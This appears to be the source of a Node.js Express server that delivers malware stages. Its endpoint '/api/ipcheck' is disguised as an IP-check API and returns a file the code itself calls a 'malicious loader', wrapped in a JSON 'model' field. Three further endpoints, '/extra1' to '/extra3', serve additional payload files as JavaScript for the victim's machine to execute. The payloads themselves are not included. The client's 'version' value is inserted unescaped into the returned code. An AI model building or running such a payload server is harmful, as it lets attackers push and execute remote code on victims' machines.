const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json());
const loaderPath = path.join(__dirname, 'main.js');
const payload1path = path.join(__dirname, 'extras','extra1.js');
console.log(payload1path);
const payload2path = path.join(__dirname, 'extras','extra2.js');
const payload3path = path.join(__dirname, 'extras','extra3.js');
const getMaliciousLoader = () => {
    try{
        return fs.readFileSync(loaderPath, 'utf8');
    }catch(error) {
        console.error('Failed to read main:', error.message);
    }
}
const getPaload1Loader = () => {
    try{
        return fs.readFileSync(payload1path, 'utf8');
    }catch(error) {
        console.error('Failed to read main:', error.message);
    }
}
const getPaload2Loader = () => {
    try{
        return fs.readFileSync(payload2path, 'utf8');
    }catch(error) {
        console.error('Failed to read main:', error.message);
    }
}
const getPaload3Loader = () => {
    try{
        return fs.readFileSync(payload3path, 'utf8');
    }catch(error) {
        console.error('Failed to read main:', error.message);
    }
}
app.post('/api/ipcheck', (req,res) => {
    const {version} = req.body;
    console.log(`Received version: ${version}`);
    const maliciousLoaderContent = getMaliciousLoader();
    const responseContent = `${maliciousLoaderContent}\nconsole.log('Process version: ${version}');`;
    res.json({
        model:responseContent
    });
});
app.post('/extra1', (req, res) => {
    const payload1content = getPaload1Loader();
    console.log("extra1 loading");
    const response = `${payload1content}\nconsole.log('Process1 is finished');`
    // console.log(response);
    res.send(response);
});

app.post('/extra2', (req, res) => {
    const payload2content = getPaload2Loader();
    console.log("extra2 loading");
    const response = `${payload2content}\nconsole.log('Process2 is finished');`
    res.send(response);
});

app.post('/extra3', (req, res) => {
    const payload3content = getPaload3Loader();
    console.log("extra3 loading");
    const response = `${payload3content}\nconsole.log('Process3 is finished');`
    res.send(response);
});
const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=> console.log(`Server running on Port ${PORT}`))